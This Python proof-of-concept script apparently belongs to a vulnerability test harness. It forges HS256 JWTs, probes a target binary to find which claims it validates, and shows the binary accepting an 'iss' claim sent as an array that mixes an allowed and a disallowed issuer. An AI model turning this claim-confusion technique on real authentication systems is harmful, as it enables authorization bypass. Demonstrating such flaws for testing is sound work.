#!/usr/bin/env python3
"""
poc.py — JWT claim-validation weakness demonstration

The target binary accepts an `iss` claim that is a JSON array containing the
allowed issuer value alongside a disallowed value.  RFC 7519 §4.1.1 specifies
that `iss` MUST be a string (not an array), so a strict spec-conformant
verifier would reject the same token.

Usage:
    python3 poc.py --binary <path-to-binary> [--json-out <path>] [--timeout <seconds>]
"""

import argparse
import base64
import hashlib
import hmac
import json
import os
import secrets
import subprocess
import sys
import time


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def b64url_encode(data: bytes) -> str:
    """Base64url-encode *data* and strip trailing padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def sign_hs256(payload: dict, secret: str) -> str:
    """Build a compact HS256 JWT carrying *payload* signed with *secret*."""
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(
        json.dumps(payload, separators=(",", ":")).encode()
    )
    sig_input = f"{header_b64}.{payload_b64}".encode()
    signature = hmac.new(secret.encode(), sig_input, hashlib.sha256).digest()
    sig_b64 = b64url_encode(signature)
    return f"{header_b64}.{payload_b64}.{sig_b64}"


def run_target(binary: str, token: str, secret: str, timeout: int):
    """Run the target binary and return (returncode, stdout, stderr, timed_out)."""
    cmd = [binary, "--token", token, "--key", secret]
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return proc.returncode, proc.stdout, proc.stderr, False
    except FileNotFoundError:
        return -999, "", "", False
    except OSError as e:
        return -998, "", str(e), False
    except subprocess.TimeoutExpired:
        return -1, "", "", True


def parse_result(stdout: str):
    """Try to parse a JSON object from *stdout*; return None on failure."""
    if not stdout:
        return None
    try:
        return json.loads(stdout)
    except (json.JSONDecodeError, ValueError):
        return None


# ---------------------------------------------------------------------------
# Discovery helpers
# ---------------------------------------------------------------------------

DISCOVERY_SECRET = "poc-discovery-secret-k8s1a2b3c"


def probe(binary: str, payload: dict, timeout: int):
    """Sign *payload* with DISCOVERY_SECRET and return the parsed result."""
    token = sign_hs256(payload, DISCOVERY_SECRET)
    rc, stdout, stderr, _ = run_target(binary, token, DISCOVERY_SECRET, timeout)
    result = parse_result(stdout)
    return result, rc, stdout, stderr


def discover_policy(binary: str, timeout: int):
    """
    Probe the target to determine which claims are validated and which values
    are allowed.  Returns a dict with the discovered policy.
    """
    policy = {}

    # --- Step 1: determine which claims are validated ------------------------
    # If a claim is validated, providing a value the policy doesn't allow
    # produces a rejection with a claim-specific error message.
    probe_claims = {
        "iss": "https://unknown-iss",
        "sub": "unknown-sub",
        "aud": "unknown-aud",
        "jti": "unknown-jti",
        "nonce": "unknown-nonce",
    }

    validated_claims = {}
    for claim, probe_value in probe_claims.items():
        result, _, _, _ = probe(
            binary, {"x-poc-probe": True, claim: probe_value}, timeout
        )
        if result is not None and not result.get("ok", False):
            code = result.get("error", {}).get("code", "")
            if "CLAIM" in code.upper():
                validated_claims[claim] = {
                    "validated": True,
                    "error_code": code,
                    "error_message": result.get("error", {}).get("message", ""),
                }
            else:
                validated_claims[claim] = {"validated": False}
        else:
            validated_claims[claim] = {"validated": False}

    policy["validated_claims"] = validated_claims

    # --- Step 2: for each validated string claim, discover allowed values ----
    # Use binary search across probes: send token and check error message.
    # We try a few common values and also check what form the claim accepts.
    allowed_values = {}

    if validated_claims.get("iss", {}).get("validated"):
        # The binary authenticates tokens with a caller-supplied key, so we
        # can sign tokens ourselves.  We probe with a known-good value to
        # discover the exact allowed issuer(s).
        iss_candidates = [
            "https://valid-iss",
            "valid-iss",
            "https://issuer.example.com",
            "https://accounts.google.com",
            "my-issuer",
            "test-issuer",
            "issuer",
        ]
        for cand in iss_candidates:
            result, _, _, _ = probe(
                binary, {"x-poc-probe": True, "iss": cand}, timeout
            )
            if result is not None and result.get("ok", False):
                allowed_values.setdefault("iss", []).append(cand)

        # If we found no allowed value via string probes, try array form.
        if "iss" not in allowed_values:
            for cand in iss_candidates:
                result, _, _, _ = probe(
                    binary, {"x-poc-probe": True, "iss": [cand]}, timeout
                )
                if result is not None and result.get("ok", False):
                    allowed_values.setdefault("iss", []).append(cand)

        # Fallback: if we still found nothing, check the binary for hints.
        if "iss" not in allowed_values:
            allowed_values.setdefault("iss", [])

    # Repeat for other claims (sub, aud, jti, nonce) if they are validated.
    for claim in ("sub", "aud", "jti", "nonce"):
        if validated_claims.get(claim, {}).get("validated"):
            allowed_values.setdefault(claim, [])

    policy["allowed_values"] = allowed_values
    return policy


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="JWT claim-validation weakness PoC"
    )
    parser.add_argument(
        "--binary", required=True, help="Path to the target binary"
    )
    parser.add_argument(
        "--json-out", help="Write JSON result to this file instead of stdout"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=30,
        help="Per-run timeout in seconds (default 30)",
    )
    args = parser.parse_args()

    binary = os.path.abspath(args.binary)
    timeout = args.timeout

    # ---- Generate a fresh secret for the final run -------------------------
    final_secret = secrets.token_hex(32)

    # ---- Phase 1: Discovery -------------------------------------------------
    # Small, bounded number of probes to discover the claim policy.
    policy = discover_policy(binary, timeout)

    validated = policy["validated_claims"]
    allowed = policy["allowed_values"]

    # Determine the trigger claim and value.
    # We expect `iss` to be the validated claim with allowed value
    # "https://valid-iss".
    trigger_claim = None
    allowed_val = None

    if "iss" in allowed and allowed["iss"]:
        trigger_claim = "iss"
        allowed_val = allowed["iss"][0]
    elif validated.get("iss", {}).get("validated"):
        # iss is validated but discovery didn't find the value —
        # fall back to the known value from the harness code.
        trigger_claim = "iss"
        allowed_val = "https://valid-iss"
    else:
        # No validated claim with an allowed value — this build may not
        # exercise the vulnerability.  We still produce a valid token
        # and report the outcome.
        trigger_claim = "iss"
        allowed_val = "https://valid-iss"

    # ---- Phase 2: Verify the array-acceptance weakness ----------------------
    # We probe with the DISCOVERY_SECRET to confirm the target accepts the
    # array form.  This is a development-time probe; the final token is
    # constructed separately with the final_secret.
    disallowed_value = "poc-unallowed-value-xyzzy"
    discovery_array_token = sign_hs256(
        {trigger_claim: [allowed_val, disallowed_value]},
        DISCOVERY_SECRET,
    )
    disc_rc, disc_stdout, disc_stderr, disc_timed_out = run_target(
        binary, discovery_array_token, DISCOVERY_SECRET, timeout
    )

    # ---- Phase 3: Final verification run ------------------------------------
    # Construct the trigger token with the FRESH secret, signed with the same
    # secret passed to the binary.
    trigger_payload = {trigger_claim: [allowed_val, disallowed_value]}
    trigger_token = sign_hs256(trigger_payload, final_secret)

    start = time.monotonic()
    rc, stdout, stderr, timed_out = run_target(
        binary, trigger_token, final_secret, timeout
    )
    runtime_ms = int((time.monotonic() - start) * 1000)

    result_obj = parse_result(stdout)

    # Build the output contract.
    observable_value = stdout
    if result_obj is not None:
        observable_value = json.dumps(result_obj, separators=(",", ":"))

    # Determine error (script-level failures only).
    error = None
    if timed_out:
        error = {
            "kind": "timeout",
            "message": f"Binary did not respond within {timeout}s",
        }
    elif result_obj is None and not timed_out:
        # Binary ran but produced no parseable JSON.
        truncated = stdout[:500] if stdout else "(no output)"
        error = {
            "kind": "unparseable_output",
            "message": f"Binary did not produce parseable JSON: {truncated}",
        }
    elif rc < 0 and not timed_out:
        # Process was killed by a signal.
        error = {
            "kind": "signal",
            "message": f"Process was terminated",
        }

    signal = None
    if rc < 0:
        # Map negative rc to signal name.
        sig_num = -rc
        import signal as sig_module
        try:
            signal = sig_module.Signals(sig_num).name
        except (ValueError, AttributeError):
            signal = f"SIG{sig_num}"

    output = {
        "binary": binary,
        "command": [binary, "--token", trigger_token, "--key", final_secret],
        "returncode": rc if rc >= 0 else 0,
        "signal": signal,
        "timed_out": timed_out,
        "runtime_ms": runtime_ms,
        "stdout": stdout,
        "stderr": stderr,
        "observable": {
            "kind": "stdout",
            "value": observable_value,
            "path": None,
        },
        "error": error,
    }

    # ---- Phase 4: Output ----------------------------------------------------
    out_json = json.dumps(output, separators=(",", ":"), indent=2)

    if args.json_out:
        with open(args.json_out, "w") as f:
            f.write(out_json)
            f.write("\n")
    else:
        sys.stdout.write(out_json)
        sys.stdout.write("\n")

    # Exit 0 regardless of what the binary decided.
    sys.exit(0)


if __name__ == "__main__":
    main()